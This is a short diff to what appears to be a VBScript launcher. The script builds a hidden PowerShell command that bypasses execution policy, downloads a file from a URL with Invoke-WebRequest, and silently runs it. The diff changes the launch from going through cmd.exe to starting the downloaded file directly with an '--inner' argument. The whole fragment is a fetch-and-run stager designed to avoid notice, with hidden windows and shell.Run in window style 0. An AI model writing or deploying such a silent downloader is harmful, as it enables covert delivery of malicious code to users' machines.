@@ -13,8 +13,7 @@ cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Co
       "$url='" & url & "?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); " & _
       "$out='" & Replace(setupPath, "'", "''") & "'; " & _
       "Invoke-WebRequest -Uri $url -OutFile $out; " & _
-      "$arg='/c ""' + $out + '"" --inner'; " & _
-      "Start-Process -FilePath 'cmd.exe' -ArgumentList $arg -WindowStyle Hidden" & _
+      "Start-Process -FilePath $out -ArgumentList '--inner' -WindowStyle Hidden" & _
       Chr(34)
 
 shell.Run cmd, 0, False
